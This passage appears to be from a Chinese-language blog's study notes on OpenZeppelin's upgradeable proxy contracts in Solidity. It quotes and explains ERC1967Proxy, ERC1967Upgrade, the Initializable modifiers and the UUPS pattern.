call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes）        default &#123;            return(0, returndatasize())        &#125;    &#125;&#125;</code></pre><hr><h2 id="openzepplin代理-核心"><a href="#openzepplin代理-核心" class="headerlink" title="openzepplin代理 核心"></a>openzepplin代理 核心</h2><p>1.<strong>proxy</strong><br>此抽象合约提供了一个回退函数，该函数使用 EVM 将所有调用委托给另一个合约指令，第二个合约的实现必须通过覆盖虚拟_implementation函数来指定<br>2.<strong>ERC1967Proxy</strong><br>此协定实现可升级的代理。它是可升级的，因为调用被委托给可以更改的实现地址</p><pre><code>contract ERC1967Proxy is Proxy, ERC1967Upgrade &#123;    constructor(address _logic, bytes memory _data) payable &#123;        _upgradeToAndCall(_logic, _data, false);    &#125;    function _implementation() internal view virtual override returns (address impl) &#123;        return ERC1967Upgrade._getImplementation();    &#125;&#125;</code></pre><p>3.<strong>ERC1967Upgrade</strong><br>整理下其中的函数和事件<br>首先是回调函数：</p><pre><code> function _upgradeBeaconToAndCall(        address newBeacon,        bytes memory data,        bool forceCall    ) internal &#123;        _setBeacon(newBeacon);        emit BeaconUpgraded(newBeacon);        if (data.length &gt; 0 || forceCall) &#123;            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);        &#125;    &#125;&#125;</code></pre><p>它将调用数据传给目标合约<br>三个事件：</p><pre><code>event AdminChanged(address previousAdmin, address newAdmin);//更改管理员时触发event Upgraded(address indexed implementation);//升级时触发event BeaconUpgraded(address indexed beacon)；//升级信标时触发</code></pre><p>获得当前管理：</p><pre><code> function _getAdmin() internal view returns (address) &#123;    return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;&#125;</code></pre><p>更改管理：</p><pre><code>function _changeAdmin(address newAdmin) internal &#123;    emit AdminChanged(_getAdmin(), newAdmin);    _setAdmin(newAdmin);&#125;function _setAdmin(address newAdmin) private &#123;    require(newAdmin != address(0), &quot;ERC1967: new admin is the zero address&quot;);    StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;&#125;</code></pre><p>返回信标：</p><pre><code> function _getBeacon() internal view returns (address) &#123;    return StorageSlot.getAddressSlot(_BEACON_SLOT).value;&#125;</code></pre><p>设置一个新信标在EIP1967 beacon solt：</p><pre><code> function _setBeacon(address newBeacon) private &#123;    require(Address.isContract(newBeacon), &quot;ERC1967: new beacon is not a contract&quot;);    require(        Address.isContract(IBeacon(newBeacon).implementation()),        &quot;ERC1967: beacon implementation is not a contract&quot;    );    StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;&#125;</code></pre><p>获得当前目标地址：</p><pre><code> function _getImplementation() internal view returns (address) &#123;    return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;&#125;</code></pre><p>更新目标地址：</p><pre><code> function _upgradeTo(address newImplementation) internal &#123;    _setImplementation(newImplementation);    emit Upgraded(newImplementation);&#125;function _setImplementation(address newImplementation) private &#123;    require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);    StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;&#125;</code></pre><p>更改并调用：</p><pre><code> function _upgradeToAndCall(    address newImplementation,    bytes memory data,    bool forceCall) internal &#123;    _upgradeTo(newImplementation);    if (data.length &gt; 0 || forceCall) &#123;        Address.functionDelegateCall(newImplementation, data);    &#125;&#125;  function _upgradeToAndCallUUPS(    address newImplementation,    bytes memory data,    bool forceCall) internal &#123;    if (StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) &#123;        _setImplementation(newImplementation);    &#125; else &#123;        try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) &#123;            require(slot == _IMPLEMENTATION_SLOT, &quot;ERC1967Upgrade: unsupported proxiableUUID&quot;);        &#125; catch &#123;            revert(&quot;ERC1967Upgrade: new implementation is not UUPS&quot;);        &#125;        _upgradeToAndCall(newImplementation, data, forceCall);    &#125;&#125;</code></pre><hr><h2 id="Contract-Initializable"><a href="#Contract-Initializable" class="headerlink" title="Contract Initializable"></a>Contract Initializable</h2><p>用于帮助编写可升级的合约或将要部署的任何类型的合约部署在代理后面</p><p>初始化函数使用版本号。一旦使用了版本号，它就会被使用，并且不能 重用。此机制可防止重新执行每个“步骤”</p><pre><code>function isConstructor() private view returns (bool) &#123;    address self = address(this);    uint256 cs;    assembly &#123; cs := extcodesize(self) &#125; //检查当前地址代码量    return cs == 0;&#125;</code></pre><p>修饰符：</p><pre><code> modifier initializer() &#123;    require(initializing || isConstructor() || !initialized, &quot;Contract instance has already been initialized&quot;);    bool isTopLevelCall = !initializing;    if (isTopLevelCall) &#123;    initializing = true;    initialized = true;    &#125;    _;  //执行完函数体 initializing状态改变    if (isTopLevelCall) &#123;    initializing = false;    &#125;&#125;</code></pre><h2 id="abstract-contract-Initializable"><a href="#abstract-contract-Initializable" class="headerlink" title="abstract contract Initializable"></a>abstract contract Initializable</h2><p>三个修饰符<br>1.只在进行中</p><pre><code> modifier onlyInitializing() &#123;    require(_initializing, &quot;Initializable: contract is not initializing&quot;);    _;&#125;</code></pre><p>2.更新版本</p><pre><code>modifier reinitializer(uint8 version) &#123;    require(!_initializing &amp;&amp; _initialized &lt; version, &quot;Initializable: contract is already initialized&quot;);    _initialized = version;    _initializing = true;    _;    _initializing = false;    emit Initialized(version);&#125;</code></pre><p>3.初始化</p><pre><code>modifier initializer() &#123;    bool isTopLevelCall = !_initializing;    require(        (isTopLevelCall &amp;&amp; _initialized &lt; 1) || (!Address.isContract(address(this)) &amp;&amp; _initialized == 1),        &quot;Initializable: contract is already initialized&quot;    );    //需要从来没有初始化，或者更新版本为1    _initialized = 1;    if (isTopLevelCall) &#123;        _initializing = true;    &#125;    _;    if (isTopLevelCall) &#123;        _initializing = false;        emit Initialized(1);    &#125;&#125;</code></pre><p>函数：报废</p><pre><code>function _disableInitializers() internal virtual &#123;    require(!_initializing, &quot;Initializable: contract is initializing&quot;);    if (_initialized != type(uint8).max) &#123;        _initialized = type(uint8).max;        emit Initialized(type(uint8).max);    &#125;&#125;</code></pre><hr><h2 id="OpenZepplin的UUPS代理模式"><a href="#OpenZepplin的UUPS代理模式" class="headerlink" title="OpenZepplin的UUPS代理模式"></a>OpenZepplin的UUPS代理模式</h2><p>轻量级又通用<br>UUPS 代理中，升级由实现处理，最终可以删除<br>UUPS 代理是使用ERC1967Proxy。实现的作用是，除了合约的逻辑之外，还包括更新存储在代理存储空间中特定插槽中的实现地址所需的所有代码。</p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
